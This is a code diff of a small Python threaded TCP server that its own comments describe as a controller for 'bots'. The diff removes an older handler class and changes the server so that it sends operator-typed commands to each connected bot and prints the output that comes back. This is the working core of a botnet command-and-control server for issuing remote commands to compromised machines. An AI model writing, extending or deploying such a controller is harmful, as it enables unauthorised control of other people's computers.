@@ -1,28 +1,5 @@
-#import socket
 import threading
 import socketserver
-'''
-class BotHandler(socketserver.BaseRequestHandler):
-
-        #Handles the behaviour of the client connection
-        def handle(self):
-                self.data = self.request.recv(1024).strip()
-                print("Bot with IP {} sent:".format(self.client_address[0]))
-                print(self.data)
-                #If we don't have the while loop, the connection is "handled"
-                # once, but then once the method ends it just hangs
-                # So, the loop ensures we can keep sending commands, BUT it also
-                # takes up the entire process. 
-                # So, we basically need to multithread
-                #TODO: This will not work if we want to select which bots to send commands to.
-                while True:
-                        #Now, let's figure out how to get it to send commands instead!
-                        command =""
-                        command = input("Please enter a command: ")
-                        self.request.sendall(command.encode())
-                        message = self.request.recv(1024).strip()
-                        print(message)
-'''
 
 class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
@@ -33,10 +10,10 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
         self.request.sendall(response)
         while True:
                 #Now, let's figure out how to get it to send commands instead!
-                command ="pwd"
+                command =input("Enter a command for {}:\n".format(cur_thread.name))
                 self.request.sendall(command.encode())
-                message = self.request.recv(1024).strip()
-                response = bytes("{}: {}".format(cur_thread.name, message), 'ascii')
+                message = self.request.recv(1024).strip().decode()
+                response = bytes("{}: {}".format(cur_thread.name, message), 'ascii').decode()
                 print(response)
 
 class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
@@ -46,6 +23,7 @@ if __name__ == "__main__":
     HOST, PORT = "", 8000
 
     server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
+    socketserver.TCPServer.allow_reuse_address = True
     with server:
         ip, port = server.server_address
 
